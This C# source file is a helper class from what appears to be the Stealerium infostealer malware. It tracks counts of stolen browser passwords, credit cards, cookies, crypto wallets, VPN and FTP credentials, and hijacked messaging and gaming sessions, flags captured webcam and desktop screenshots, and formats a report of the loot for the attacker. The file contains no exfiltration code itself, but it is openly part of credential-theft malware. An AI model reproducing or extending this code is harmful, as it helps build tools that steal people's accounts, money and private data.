using System.Collections.Generic;

namespace Stealerium.Helpers
{
    /// <summary>
    /// A helper class to track and format data collection statistics and status for various services.
    /// </summary>
    internal sealed class Counter
    {
        // Browser-related data counts
        public static int Passwords { get; set; } = 0;
        public static int CreditCards { get; set; } = 0;
        public static int AutoFill { get; set; } = 0;
        public static int Cookies { get; set; } = 0;
        public static int History { get; set; } = 0;
        public static int Bookmarks { get; set; } = 0;
        public static int Downloads { get; set; } = 0;

        // Application-related data counts
        public static int Vpn { get; set; } = 0;
        public static int Pidgin { get; set; } = 0;
        public static int Wallets { get; set; } = 0;
        public static int BrowserWallets { get; set; } = 0;
        public static int FtpHosts { get; set; } = 0;

        // Session and token detection for various messaging and app services
        public static bool Element { get; set; } = false;
        public static bool Signal { get; set; } = false;
        public static bool Tox { get; set; } = false;
        public static bool Icq { get; set; } = false;
        public static bool Skype { get; set; } = false;
        public static bool Discord { get; set; } = false;
        public static bool Telegram { get; set; } = false;
        public static bool Outlook { get; set; } = false;
        public static bool Steam { get; set; } = false;
        public static bool Uplay { get; set; } = false;
        public static bool BattleNet { get; set; } = false;

        // System data tracking
        public static int SavedWifiNetworks { get; set; } = 0;
        public static bool ProductKey { get; set; } = false;
        public static bool DesktopScreenshot { get; set; } = false;
        public static bool WebcamScreenshot { get; set; } = false;

        // Grabber statistics for different types of files collected
        public static int GrabberImages { get; set; } = 0;
        public static int GrabberDocuments { get; set; } = 0;
        public static int GrabberDatabases { get; set; } = 0;
        public static int GrabberSourceCodes { get; set; } = 0;

        // Detection of Banking, Crypto, and Porn services
        public static bool BankingServices { get; } = false;
        public static bool CryptoServices { get; } = false;
        public static bool PornServices { get; } = false;
        public static List<string> DetectedBankingServices { get; } = new List<string>();
        public static List<string> DetectedCryptoServices { get; } = new List<string>();
        public static List<string> DetectedPornServices { get; } = new List<string>();

        // Utility Methods for formatting output

        /// <summary>
        /// Returns a formatted string if the boolean value indicates success.
        /// </summary>
        /// <param name="application">The name of the application or service.</param>
        /// <param name="value">A boolean indicating success (true) or failure (false).</param>
        /// <returns>A formatted string for success, or an empty string if false.</returns>
        public static string GetSValue(string application, bool value)
        {
            return value ? $"\n   ∟ {application}" : string.Empty;
        }

        /// <summary>
        /// Returns a formatted string with the application name and count if the value is non-zero.
        /// </summary>
        /// <param name="application">The name of the application or service.</param>
        /// <param name="value">An integer count value.</param>
        /// <returns>A formatted string with the count if the value is not zero, or an empty string.</returns>
        public static string GetIValue(string application, int value)
        {
            return value != 0 ? $"\n   ∟ {application}: {value}" : string.Empty;
        }

        /// <summary>
        /// Returns a formatted string for a list of detected services, sorted alphabetically.
        /// </summary>
        /// <param name="application">The name of the application or service.</param>
        /// <param name="value">A list of strings representing detected services.</param>
        /// <param name="separator">A character to use as a separator (default is '∟').</param>
        /// <returns>A formatted string representing the list or an empty "No data" string if the list is empty.</returns>
        public static string GetLValue(string application, List<string> value, char separator = '∟')
        {
            // Sort the list of services alphabetically
            value.Sort();

            // Format the list if there are any detected items, otherwise return "No data"
            return value.Count != 0
                ? $"\n   {separator} {application}:\n\t\t{separator} " + string.Join($"\n\t\t{separator} ", value)
                : $"\n   {separator} {application} (No data)";
        }

        /// <summary>
        /// Returns a success or failure message based on the boolean value.
        /// </summary>
        /// <param name="value">A boolean indicating success or failure.</param>
        /// <param name="success">Message to display on success (true).</param>
        /// <param name="failure">Message to display on failure (false).</param>
        /// <returns>A formatted success message if true, or a failure message if false.</returns>
        public static string GetBValue(bool value, string success, string failure)
        {
            return value ? $"\n   ∟ {success}" : $"\n   ∟ {failure}";
        }
    }
}
